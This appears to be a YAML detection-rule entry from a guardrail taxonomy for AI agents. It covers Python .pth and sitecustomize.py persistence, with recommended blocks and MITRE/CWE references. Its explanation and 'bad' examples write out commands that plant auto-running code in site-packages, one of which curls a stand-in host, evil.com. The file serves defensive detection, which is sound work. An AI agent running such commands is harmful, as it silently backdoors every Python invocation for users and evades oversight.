id: "persistence-evasion/shell-init/python-pth-persistence"
version: "1.0.0"
kingdom: "Persistence & Defense Evasion"
kingdom_id: 6
category: "Shell and Interpreter Startup"
category_id: "6.6"
name: "Python .pth File and sitecustomize.py Persistence"
risk_level: "high"

abstract: |
  An AI agent writes malicious Python .pth files or sitecustomize.py to
  site-packages directories, causing arbitrary code execution on every Python
  invocation — including pip, pytest, Django management commands, and Jupyter
  notebooks — without any visible indication.

explanation: |
  Python's site module automatically processes all .pth files in
  site-packages and dist-packages directories on every Python startup.
  A .pth file beginning with "import" executes that statement immediately:

    echo 'import os; os.system("curl evil.com/beacon")' > \
      /usr/lib/python3/dist-packages/persistence.pth
    → Runs on every `python`, `pip install`, `pytest`, `jupyter` invocation

  Similarly, sitecustomize.py and usercustomize.py are auto-imported
  before user code runs:

    cp backdoor.py ~/.local/lib/python3.11/site-packages/sitecustomize.py
    → Runs before any Python script, including system tools

  This is particularly dangerous because:
  1. .pth files are plain text — no compilation needed
  2. Survive pip upgrades and virtualenv rebuilds
  3. Filename can be anything (z_innocent.pth)
  4. .pth execution produces no log entries — completely silent
  5. Affects all Python invocations by any user who shares the site-packages

recommendation: |
  - Block writes to site-packages/*.pth files.
  - Block writes to sitecustomize.py and usercustomize.py.
  - Mount site-packages directories read-only in AI agent containers.
  - Monitor Python startup files via file integrity monitoring.

examples:
  bad:
    - "echo 'import os; os.system(\"curl evil.com\")' > /usr/lib/python3/dist-packages/evil.pth"
    - "cp backdoor.py ~/.local/lib/python3.11/site-packages/sitecustomize.py"
    - "tee /usr/local/lib/python3.12/site-packages/z_hook.pth <<< 'import subprocess'"
  good:
    - "pip install requests"
    - "python -m site --user-site"

compliance:
  owasp-llm-2025: ["LLM06"]
  iso-27001-2022: ["A.8.9", "A.8.25"]
  eu-ai-act-2024: ["Art.9", "Art.15"]
  nist-ai-rmf-1.0: ["MANAGE-1", "MANAGE-4"]
  soc2-type2: ["CC6.1", "CC7.1"]

references:
  mitre_attack: ["T1546.016", "T1059.006"]
  cwe: ["CWE-94"]
  external:
    - title: "MITRE ATT&CK: Boot or Logon Initialization Scripts: Python Path Interception"
      url: "https://attack.mitre.org/techniques/T1546/016/"
    - title: "Python site module documentation"
      url: "https://docs.python.org/3/library/site.html"

analyzers: ["regex"]
related_rules: ["ts-block-python-pth-write", "ts-block-python-pth-tee", "ts-block-python-pth-cp", "ts-block-python-sitecustomize-write"]
